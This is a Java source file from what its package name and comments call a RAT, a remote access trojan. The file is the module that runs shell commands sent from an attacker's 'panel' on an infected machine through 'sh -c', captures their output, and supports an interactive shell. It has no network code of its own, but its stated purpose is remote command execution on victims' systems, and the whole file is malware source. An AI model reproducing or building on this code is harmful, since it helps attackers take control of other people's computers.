package com.darkbiit.rat;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

/**
 * Shell command execution for the RAT.
 *
 * The command is executed via "sh -c" so the panel can use pipes and
 * redirection. Output is capped: a command like "cat /dev/zero" would
 * otherwise block the bot thread forever.
 */
public final class RatShell {

    private RatShell() {
    }

    /** Result of a shell command. */
    public static final class Result {
        public final int exit;
        public final String stdout;
        public final String stderr;
        public final boolean truncated;

        Result(int exit, String stdout, String stderr, boolean truncated) {
            this.exit = exit;
            this.stdout = stdout;
            this.stderr = stderr;
            this.truncated = truncated;
        }
    }

    /** Runs a command with a timeout (milliseconds) and an output cap. */
    public static Result run(String command, long timeoutMs, int maxOutput) {
        Process p = null;
        try {
            p = new ProcessBuilder("sh", "-c", command)
                    .redirectErrorStream(false)
                    .start();

            StringBuilder out = new StringBuilder();
            StringBuilder err = new StringBuilder();
            boolean[] truncated = { false };

            Thread to = pump(p.getInputStream(), out, maxOutput, truncated);
            Thread te = pump(p.getErrorStream(), err, maxOutput, truncated);

            int exit = waitFor(p, timeoutMs);
            if (exit == -1) {
                p.destroy();
                // give it a moment, then force
                try {
                    Thread.sleep(200);
                } catch (InterruptedException ignored) {
                    Thread.currentThread().interrupt();
                }
                p.destroyForcibly();
                exit = -1;
            }

            join(to);
            join(te);

            return new Result(exit, out.toString(), err.toString(), truncated[0]);
        } catch (IOException e) {
            return new Result(-2, "", e.toString(), false);
        } finally {
            if (p != null) {
                p.destroy();
            }
        }
    }

    private static Thread pump(final java.io.InputStream is,
                               final StringBuilder sink,
                               final int max,
                               final boolean[] truncated) {
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                BufferedReader r = new BufferedReader(new InputStreamReader(is));
                char[] buf = new char[4096];
                int n;
                try {
                    while ((n = r.read(buf)) > 0) {
                        if (sink.length() + n > max) {
                            int room = Math.max(0, max - sink.length());
                            sink.append(buf, 0, room);
                            truncated[0] = true;
                            break;
                        }
                        sink.append(buf, 0, n);
                    }
                } catch (IOException ignored) {
                    // stream closed on process kill
                }
            }
        });
        t.setDaemon(true);
        t.start();
        return t;
    }

    private static int waitFor(Process p, long timeoutMs) {
        try {
            if (timeoutMs <= 0) {
                return p.waitFor();
            }
            long deadline = System.currentTimeMillis() + timeoutMs;
            while (System.currentTimeMillis() < deadline) {
                try {
                    return p.exitValue();
                } catch (IllegalThreadStateException notYet) {
                    Thread.sleep(50);
                }
            }
            return -1;
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return -1;
        }
    }

    private static void join(Thread t) {
        try {
            t.join(1000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    /** Convenience: run a command and return the list of lines. */
    public static List<Object> runLines(String command, long timeoutMs) {
        Result r = run(command, timeoutMs, RatCfg.MAX_SHELL_OUTPUT);
        List<Object> lines = new ArrayList<Object>();
        for (String line : r.stdout.split("\n", -1)) {
            lines.add(line);
        }
        return lines;
    }

    /** Writes stdin to a running process; used by the interactive shell command. */
    public static void writeStdin(DataOutputStream stdin, String data) throws IOException {
        stdin.write(data.getBytes("UTF-8"));
        stdin.flush();
    }

    /** Working directory helper for the panel. */
    public static File cwd() {
        return new File(System.getProperty("user.dir", "/"));
    }
}
